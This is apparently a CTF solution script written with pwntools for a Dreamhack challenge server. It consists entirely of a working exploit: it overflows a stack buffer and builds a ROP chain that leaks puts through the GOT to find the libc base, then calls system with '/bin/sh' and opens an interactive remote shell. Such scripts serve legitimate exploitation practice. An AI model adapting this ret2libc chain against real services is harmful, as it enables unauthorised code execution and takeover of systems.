from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 14903
r = remote(HOST, PORT)

safe=0x404010
main=0x401446
ret=0x40101a
puts_got=0x403fa8
puts_plt=0x4010c0
pop_rdi_rbp=0x40129b

r.sendafter(b'> ', b'Decision2Solve\x00\x00')
r.send(p64(safe))
r.send(b'\x46\x14\x40\x00\x00\x00')
r.sendafter(b'> ', b'1')

for i in range(950):
    r.sendafter(b'> ', b'Decision2Solve\x00\x00')
    r.sendafter(b'> ', b'1')

r.sendafter(b'> ', b'Decision2Solve\x00\x00')
r.sendafter(b'> ', b'2')

payload = b'A'*40+p64(ret)+p64(pop_rdi_rbp)+p64(puts_got)+p64(0)+p64(puts_plt)+p64(main)
r.send(payload.ljust(0x10000, b'\x00'))

libc=u64(r.recvline().strip().ljust(8,b'\x00'))-0x80ed0
system=libc+0x50d60
binsh=libc+0x1d8698

r.sendafter(b'> ', b'Decision2Solve\x00\x00')
r.sendafter(b'> ', b'2')

payload = b'A'*40+p64(pop_rdi_rbp)+p64(binsh)+p64(0)+p64(system)+p64(main)
r.send(payload.ljust(0x10000, b'\x00'))

r.interactive()